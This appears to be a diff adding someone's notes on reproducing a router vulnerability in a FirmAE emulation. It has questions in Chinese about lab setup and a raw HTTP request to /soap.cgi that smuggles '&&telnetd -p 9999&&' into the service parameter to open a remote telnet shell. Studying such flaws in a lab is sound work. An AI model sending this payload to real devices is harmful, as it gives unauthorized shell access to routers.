@@ -1,0 +1,12 @@
+1，路由器就是服务器就是服务器角色？POC是需要在路由器连接互联网情况下进行吗？
+3，仿真之后，路由器没有连接互联网，这个是firmAE的事情，还自己配置？没有登陆权限怎么配置么？
+
+
+POST /soap.cgi?service=&&telnetd -p 9999&& HTTP/1.1
+Host: 192.168.0.1:49152
+Accept-Encoding: identity
+Content-Length: 16
+SOAPAction: "whatever-serviceType#whatever-action"
+Content-Type: text/xml
+
+
